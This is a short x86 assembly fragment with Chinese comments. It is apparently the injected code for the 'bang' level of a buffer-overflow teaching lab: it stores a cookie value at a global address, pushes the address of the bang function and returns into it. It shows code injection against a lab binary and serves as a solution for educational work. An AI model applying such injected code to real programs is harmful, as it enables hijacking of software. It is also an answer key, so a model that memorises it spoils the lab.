# cookie值放到global_value
movl $0x63d2647a, 0x804a1dc
# 压入bang的地址
pushl $0x08048d60
ret
